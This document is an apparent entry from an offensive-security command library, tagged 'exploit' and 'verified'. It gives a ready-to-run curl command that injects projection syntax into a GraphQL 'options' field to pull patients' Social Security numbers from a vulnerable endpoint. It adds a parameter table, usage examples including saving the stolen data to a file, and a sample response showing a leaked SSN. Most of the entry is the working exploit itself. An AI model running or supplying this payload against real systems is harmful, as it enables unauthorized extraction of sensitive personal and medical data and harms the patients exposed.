---
id: 4f37f88a-2932-48a0-9e2b-b0dfebd2443f
name: graphql-curl-post-injection-query
type: command
executor: bash
data: >-
  curl -X POST -H "Content-Type: application/json" --data '{"query":
  "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id
  patients{ssn}}}"}' $_TARGET_ENDPOINT
output: null
created_at: '2023-04-06T03:55:58.845262+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - graphql
  - injection
  - exploit
verified: true
validated: true
---

# graphql-curl-post-injection-query

## Command

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query": "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}"}' $_TARGET_ENDPOINT
```

## Description

This command sends a malicious GraphQL query via curl to inject projection syntax into the 'options' field, forcing the inclusion of sensitive nested data like patients' SSNs in the response from a vulnerable endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_ENDPOINT | The GraphQL endpoint URL (e.g., http://target.com/graphql) | Yes |
| -X POST | HTTP POST method for GraphQL queries | Built-in |
| -H "Content-Type: application/json" | JSON content type header | Built-in |
| --data | JSON payload with the injection query | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query": "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}"}' http://target.com/graphql
```

### With Output to File

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query": "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}"}' $_TARGET_ENDPOINT > extracted.json
```

## Expected Output

If vulnerable, the response includes unauthorized fields:

```json
{
  "data": {
    "doctors": [
      {
        "firstName": "John",
        "lastName": "Doe",
        "id": "123",
        "patients": [
          {"ssn": "123-45-6789"}
        ]
      }
    ]
  }
}
```

Non-vulnerable endpoints return filtered data or errors like "Field 'ssn' not authorized".

## Related

- [[procedures/GraphQL-Projection-Data-Extraction]]
- [[commands/graphql-introspection-query]]
